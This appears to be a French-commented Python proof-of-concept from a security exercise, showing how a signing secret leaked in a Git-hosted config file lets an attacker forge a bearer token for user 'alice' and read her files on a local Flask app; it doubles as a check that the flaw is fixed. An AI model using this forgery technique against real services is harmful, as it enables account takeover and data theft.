import base64
import hmac
import hashlib
import time
import sys
from pathlib import Path

ROOT_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT_DIR))
from app.app import app

# Clé lue par l’attaquant dans app/config.py sur le dépôt Git :
TOKEN_SECRET = b"polytech"
client = app.test_client()

# 1. Création du compte de la victime alice
client.post("/register", json={"username": "alice", "password": "motdepasse"})

# 2. Forgeage d’un jeton par l’attaquant sans s’authentifier
target_user = "alice"
expiration = int(time.time()) + 3600
payload = f"{target_user}|{expiration}".encode()

payload_b64 = base64.urlsafe_b64encode(payload).decode()
signature = hmac.new(TOKEN_SECRET, payload, hashlib.sha256).hexdigest()

token_forge = f"{payload_b64}.{signature}"
print(f"[attaquant] Jeton forgé pour {target_user} : {token_forge}")

# 3. Utilisation du jeton forgé sur un endpoint protégé
headers = {"Authorization": f"Bearer {token_forge}"}
r = client.get("/files", headers=headers)

if r.status_code == 200:
    print(f"[+] Reussite : accès accordé sous l’identité de ’{target_user}’ !")
    print(f"[+] Liste des fichiers récupérée : {r.get_json()}")
else:
    print("[-] Échec : le jeton forgé a été refusé (service corrigé).")
